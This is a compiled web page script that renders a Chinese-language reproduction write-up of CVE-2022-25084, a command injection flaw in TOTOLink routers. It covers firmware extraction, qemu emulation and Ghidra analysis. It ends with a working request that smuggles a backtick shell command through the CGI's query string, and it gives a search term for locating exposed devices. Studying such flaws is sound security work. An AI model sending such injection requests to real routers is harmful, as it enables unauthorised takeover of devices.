(window.webpackJsonp=window.webpackJsonp||[]).push([[26],{1512:function(s,t,a){s.exports=a.p+"assets/img/1648907409606-0704b8c0-aa5c-44d4-9d45-9fd1c0c62736.4d1252be.png"},1513:function(s,t,a){s.exports=a.p+"assets/img/1648907425761-dabc39f3-ac5e-483c-b446-4e7a3883afec.cb9b744a.png"},1514:function(s,t,a){s.exports=a.p+"assets/img/1648907514313-7f8d3965-8435-484d-b67d-b04aae2da33e.4edf369f.png"},1515:function(s,t,a){s.exports=a.p+"assets/img/1648907561137-36b56f40-cc42-4c25-b53a-74554b0e5fa7.c4d9a6d8.png"},1516:function(s,t,a){s.exports=a.p+"assets/img/1648908009576-87dcb518-213e-49cf-9a00-9f3c4d90e955.53e3e67f.png"},1517:function(s,t,a){s.exports=a.p+"assets/img/1648912800395-a085fc01-e97b-4044-bc06-fc5f894928f5.644cfb90.png"},1518:function(s,t,a){s.exports=a.p+"assets/img/1648909334138-f28cf393-17e6-48a8-80f0-7a5288419e78.cebd3f3f.png"},1519:function(s,t,a){s.exports=a.p+"assets/img/1648910386798-e04871ca-ff36-4843-bb3d-2f382c078ed4.d2f6f5bb.png"},1520:function(s,t,a){s.exports=a.p+"assets/img/1648910646489-cfd02a84-6b04-4fb4-a4fa-dd3e007c045a.28a8eacf.png"},1521:function(s,t,a){s.exports=a.p+"assets/img/1648912604072-692cfff6-164e-4724-9a10-f89b3b62dc79.619aeae4.png"},1522:function(s,t,a){s.exports=a.p+"assets/img/1648912691525-e03b2fc4-4cf4-46d7-a379-e31a80d0f2d6.12ac2629.png"},3131:function(s,t,a){"use strict";a.r(t);var r=a(68),e=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"totolink-多个设备-download-cgi-远程命令执行漏洞-cve-2022-25084"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#totolink-多个设备-download-cgi-远程命令执行漏洞-cve-2022-25084"}},[s._v("#")]),s._v(" TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("TOTOLink 多个设备")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('"totolink"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("下载路由器固件")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1512),alt:"img"}})]),s._v(" "),t("p",[s._v("使用binwalk分解固件")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1513),alt:"img"}})]),s._v(" "),t("p",[s._v("查看分解出来的文件")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1514),alt:"img"}})]),s._v(" "),t("p",[t("img",{attrs:{src:a(1515),alt:"img"}})]),s._v(" "),t("p",[s._v("使用qemu搭建路由器")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#set network")]),s._v("\nsudo brctl addbr virbr2\nsudo ifconfig virbr2 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".6")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),s._v(" up\nsudo tunctl "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("t tap2\nsudo ifconfig tap2 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".6")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".11")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),s._v(" up\nsudo brctl addif virbr2 tap2\n\nqemu"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("system"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("mipsel "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("M")]),s._v(" malta "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("kernel vmlinux"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.2")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("kc"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("malta "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("hda debian_wheezy_mipsel_standard"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("qcow2 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("append "),t("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"root=/dev/sda1"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("netdev tap"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("tapnet"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("ifname"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("tap2"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("script"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("no "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("device rtl8139"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("netdev"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("tapnet "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("nographic\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("p",[s._v("创建后在qemu里执行命令启动路由器")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[s._v("ifconfig eth0 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".6")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".11")]),s._v(" up \nscp "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("r squashfs"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("root"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v(" root@"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".6")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".11")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("root"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("    \t\nchroot "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("squashfs"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("root"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("bin"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("sh\ntouch "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("run"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("lighttpd"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("pid\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("bin"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("lighttpd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("f "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("lighttp"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("lighttpd"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("conf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("m "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("lighttp"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("lib\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("注意 "),t("code",[s._v("lighttpd.conf")]),s._v(" 文件需要修改 "),t("code",[s._v("server.pid-file")]),s._v(" 参数")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1516),alt:"img"}})]),s._v(" "),t("p",[s._v("启动后访问路由器页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1517),alt:"img"}})]),s._v(" "),t("p",[s._v("我们找到需要分析的文件目录 "),t("code",[s._v("squashfs-root/web_cste/cgi-bin")])]),s._v(" "),t("p",[t("img",{attrs:{src:a(1518),alt:"img"}})]),s._v(" "),t("p",[s._v("使用Ghidra分析 cgi文件 "),t("code",[s._v("downloadFile.cgi")])]),s._v(" "),t("p",[t("img",{attrs:{src:a(1519),alt:"img"}})]),s._v(" "),t("p",[s._v("我们注意到其中的system执行命令")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[s._v("pcVar1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getenv")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"QUERY_STRING"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("memset")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("acStack1424"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x200")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("memset")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("acStack912"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x200")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sprintf")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("acStack1424"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"echo QUERY_STRING:%s >/tmp/download"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("pcVar1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("acStack1424"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("其中 getenv 从请求Url中获取参数,传参给pcVar1，再通过下面的sprintf 赋值给 acStack1424 使用 system函数 进行命令执行")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1520),alt:"img"}})]),s._v(" "),t("p",[s._v("我们构造请求包控制 QUERY_STRING 参数来进行恶意命令执行")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cgi"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("bin"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("downloadFlile"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("cgi"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[s._v("`ls>../cmd.txt`")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:a(1521),alt:"img"}})]),s._v(" "),t("p",[t("img",{attrs:{src:a(1522),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);